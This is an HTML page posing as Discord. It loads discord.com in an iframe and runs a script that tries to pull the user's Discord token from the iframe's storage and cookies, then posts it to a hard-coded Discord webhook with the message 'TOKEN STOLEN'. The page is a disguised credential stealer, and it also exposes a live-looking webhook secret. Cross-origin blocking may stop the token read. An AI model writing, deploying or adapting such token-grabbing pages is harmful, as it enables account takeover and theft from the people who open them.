<!DOCTYPE html>
<html>
<head>
    <title>Discord</title>
    <style>
        body { margin: 0; padding: 0; background: #2f3136; }
        iframe { 
            width: 100%; 
            height: 100vh; 
            border: none; 
        }
    </style>
</head>
<body>
    <!-- This loads Discord inside your page -->
    <iframe src="https://discord.com/channels/@me" id="frame"></iframe>

    <script>
        const webhook = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";

        // 1. Send Alive signal
        fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: "🟢 **SYSTEM ONLINE**" })
        });

        // 2. Try to get token from the iframe
        let token = null;
        
        try {
            // Access the iframe's content window
            const iframeWindow = document.getElementById('frame').contentWindow;
            
            // Try standard storage
            token = iframeWindow.localStorage.token || iframeWindow.sessionStorage.token;
            
            // Try cookies
            if (!token) {
                const cookies = iframeWindow.document.cookie.split(';');
                for (let cookie of cookies) {
                    if (cookie.trim().startsWith('token=')) {
                        token = cookie.split('=')[1];
                        break;
                    }
                }
            }
        } catch (e) {
            // If cross-origin blocking happens, try grabbing from the main window if they are same-origin
            // But usually, iframe access is blocked by Discord too.
        }

        if (token) {
            fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `🔥 **TOKEN STOLEN** 🔥\n\`\`\`${token}\n\`\`\`` })
            })
            .then(() => {
                setTimeout(() => {
                    document.getElementById('frame').src = "https://discord.com/channels/@me";
                }, 2000);
            });
        } else {
            fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: "⚠️ **NO TOKEN** - CORS Blocked or Not Logged In" })
            });
        }
    </script>
</body>
</html>
